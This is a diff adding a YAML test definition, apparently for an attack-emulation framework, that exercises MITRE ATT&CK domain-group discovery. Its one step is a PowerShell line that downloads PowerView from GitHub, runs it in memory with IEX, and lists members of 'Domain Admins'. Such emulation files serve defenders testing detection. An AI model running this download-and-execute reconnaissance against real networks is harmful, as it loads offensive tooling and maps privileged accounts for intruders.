@@ -1,0 +1,24 @@
+api_version: "2.0"
+name: Get-DomainGroupMember with PowerView
+description: |
+    Utilizing PowerView, run Get-DomainGroupMember to identify domain users. Upon execution, progress and info about groups within the domain being scanned will be displayed.
+uuid: 46352f40-f283-4fe5-b56d-d9a71750e145
+mitre:
+    tactics:
+        - 'TA0007: Discovery'
+    techniques:
+        - 'T1069: Permission Groups Discovery'
+    subtechniques:
+        - 'T1069.002: Domain Groups'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: get-domaingroupmember-with-powerview
+      inline: |
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+        IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroupMember "Domain Admins"
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
